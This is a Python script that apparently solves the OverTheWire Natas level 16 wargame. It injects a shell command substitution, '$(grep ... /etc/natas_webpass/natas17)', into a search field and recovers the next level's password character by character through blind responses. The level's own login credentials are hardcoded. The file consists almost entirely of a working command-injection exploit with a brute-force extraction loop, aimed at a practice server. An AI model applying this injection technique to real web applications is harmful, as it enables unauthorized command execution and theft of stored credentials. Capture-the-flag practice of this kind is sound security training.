import requests
import string

from lxml import html

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://{}.natas.labs.overthewire.org'.format(username)

def blind_grep(payload):
    data = {
        'needle': payload
    }
    response = requests.post(url, auth = (username, password), data = data)
    tree = html.fromstring(response.text)

    element = tree.xpath('/html/body/div[1]/pre')[0]

    return len(element.text) == 1

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits
current_needle = ''

for it in range(35):
    for char in alphabet:
        candidate = current_needle + char
        payload = '$(grep ^{} /etc/natas_webpass/natas17)'.format(candidate)
        if blind_grep(payload):
            current_needle = candidate
            print(candidate)
            break
